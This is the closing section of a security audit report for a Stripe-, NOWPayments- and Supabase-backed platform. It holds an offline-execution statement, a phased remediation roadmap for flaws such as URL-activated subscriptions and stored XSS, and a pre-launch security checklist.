## 7. Safe Offline Execution Boundary Verification (R3)

In accordance with requirement R3:
- **Zero Outbound Network Traffic**: All security analysis, pattern searches, and test executions took place exclusively against local repository files.
- **Zero Production API Calls**: No requests were dispatched to Stripe (`https://api.stripe.com`), NOWPayments (`https://api.nowpayments.io`), or the live Supabase project.
- **Zero Live Credential Mutation**: No live test transactions, account creations, or cloud database mutations were executed.

---

## 8. Strategic Remediation Roadmap

To ensure a secure, resilient, and profitable launch, engineering efforts should follow this prioritized three-phase roadmap:

```
+-------------------------------------------------------------------------------+
| PHASE 1: PRE-LAUNCH BLOCKERS (P0) — Days 1 to 5                              |
| - Eliminate client-side URL fulfillment (?payment_success=true) in payments.js|
| - Deploy Supabase Edge Functions for Stripe & NOWPayments webhooks            |
| - Remove sandbox simulation functions and buttons from production code        |
| - Pin search_path = public on handle_new_user() in supabase_schema.sql        |
| - Restrict storage upload policy to user folder: (storage.foldername(name))[1]|
| - Patch Stored XSS sinks in renderTable, renderGallery, and lightbox          |
+-------------------------------------------------------------------------------+
                                      |
                                      v
+-------------------------------------------------------------------------------+
| PHASE 2: DEFENSE-IN-DEPTH & HARDENING (P1) — Days 6 to 10                     |
| - Enforce has_active_subscription() in Supabase RLS policies for trades/accounts|
| - Set trade-screenshots bucket public = false and implement signed URLs       |
| - Transition accounts and trades to composite primary keys (user_id, id)      |
| - Add WITH CHECK ownership verification for account_id and session_id         |
| - Add UNIQUE(user_id) constraint to subscriptions table                       |
| - Add CSP and HSTS headers to _headers                                        |
| - Implement JSON schema validation in importData()                            |
+-------------------------------------------------------------------------------+
                                      |
                                      v
+-------------------------------------------------------------------------------+
| PHASE 3: OPERATIONAL MONITORING & CI/CD GUARDRAILS (P2) — Days 11 to 14       |
| - Integrate semgrep_rules.yml into local pre-commit and CI/CD pipelines       |
| - Automate pgTAP RLS tests in local Supabase test harness                     |
| - Mask MT5 bridge tokens in UI and recommend localhost TLS                    |
| - Eliminate mock authentication fallback in production builds                 |
+-------------------------------------------------------------------------------+
```

---

## 9. Appendix: Production Security Verification Checklist

Before opening the platform to public registrations and paid checkout:

- [ ] **Billing Integrity**:
  - [ ] `checkUrlPaymentParams()` no longer activates subscriptions from URL query strings.
  - [ ] Stripe webhook secret (`STRIPE_WEBHOOK_SECRET`) is stored in Supabase secrets, not in client code.
  - [ ] NOWPayments IPN HMAC signature verification is active in Edge Functions.
  - [ ] Dummy crypto wallet addresses and simulation buttons are completely removed.
- [ ] **Database & RLS**:
  - [ ] All tables have RLS enabled.
  - [ ] Normal authenticated users have `SELECT`-only access on `public.subscriptions`.
  - [ ] `handle_new_user()` has `SET search_path = public` and permissions revoked from `PUBLIC`.
  - [ ] Storage bucket `trade-screenshots` enforces `(storage.foldername(name))[1] = auth.uid()::text`.
  - [ ] Tables use composite primary keys `(user_id, id)` or `crypto.randomUUID()`.
- [ ] **Frontend Security**:
  - [ ] All table, gallery, and modal template insertions use `escapeGalleryHtml()`.
  - [ ] Lightbox image clicks use event delegation instead of unescaped inline `onclick`.
  - [ ] `importData()` performs JSON schema and type verification.
  - [ ] `_headers` includes strict `Content-Security-Policy` and `Strict-Transport-Security`.
- [ ] **Verification**:
  - [ ] Offline security scanner (`python scripts/offline_security_scanner.py`) executes cleanly with zero unaddressed findings.
  - [ ] Local pgTAP test suite passes (`supabase test db`).

---
*Report authored and certified by Milestone M1 Security Lead. Master Deliverable Complete.*
